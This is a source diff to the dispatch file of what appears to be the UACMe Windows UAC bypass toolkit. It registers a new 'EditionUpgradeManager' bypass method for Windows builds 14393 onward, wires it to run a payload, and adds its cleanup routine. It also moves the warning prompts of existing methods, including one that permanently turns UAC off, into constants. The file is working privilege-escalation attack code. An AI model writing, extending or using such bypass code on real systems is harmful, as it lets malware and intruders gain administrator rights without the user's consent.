@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.20
+*  VERSION:     3.21
 *
-*  DATE:        22 Oct 2019
+*  DATE:        26 Oct 2019
 *
 *  UAC bypass dispatch.
 *
@@ -69,16 +69,18 @@ UCM_API(MethodShellSdctl);
 UCM_API(MethodEgre55);
 UCM_API(MethodTokenModUIAccess);
 UCM_API(MethodShellWSReset);
+UCM_API(MethodEditionUpgradeManager);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
-#define UCM_WIN32_NOT_IMPLEMENTED_COUNT 5
+#define UCM_WIN32_NOT_IMPLEMENTED_COUNT 6
 ULONG UCM_WIN32_NOT_IMPLEMENTED[UCM_WIN32_NOT_IMPLEMENTED_COUNT] = {
     UacMethodMMC1,
     UacMethodInetMgr,
     UacMethodWow64Logger,
     UacMethodHakril,
     UacMethodDateTimeWriter,
+    UacMethodEditionUpgradeMgr
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -139,7 +141,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodEgre55, NULL, { 14393, 18362 }, FUBUKI_ID, TRUE, FALSE, TRUE },
     { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
     { MethodShellWSReset, &WDCallbackType1, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodEditionUpgradeManager, NULL, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 #define WDCallbackTypeMagicVer1 282647531814912
@@ -405,6 +408,10 @@ VOID PostCleanupAttempt(
         ucmCreateNewLinkMethodCleanup();
         break;
 
+    case UacMethodEditionUpgradeMgr:
+        ucmEditionUpgradeManagerMethodCleanup();
+        break;
+
     default:
         break;
     }
@@ -575,9 +582,7 @@ UCM_API(MethodSimda)
     //
     // Make sure user understand aftereffects.
     //
-    if (ucmShowQuestion(
-        TEXT("This method will permanently TURN UAC OFF, are you sure?")) == IDYES)
-    {
+    if (ucmShowQuestion(T_SIMDA_CONSENT_WARNING) == IDYES) {
         return ucmSimdaTurnOffUac();
     }
     return STATUS_CANCELLED;
@@ -740,9 +745,7 @@ UCM_API(MethodSXS)
             // Make sure user understand aftereffects.
             //
 #ifndef _DEBUG
-            if (ucmShowQuestion(
-                TEXT("WARNING: This method will affect UAC interface, are you sure?")) != IDYES)
-            {
+            if (ucmShowQuestion(T_SXS_CONSENT_WARNING) != IDYES) {
                 return STATUS_CANCELLED;
             }
 #endif //_DEBUG
@@ -1221,4 +1224,16 @@ UCM_API(MethodShellWSReset)
     }
 
     return Result;
+}
+
+UCM_API(MethodEditionUpgradeManager)
+{
+#ifndef _WIN64
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#else
+    return ucmEditionUpgradeManagerMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#endif
 }
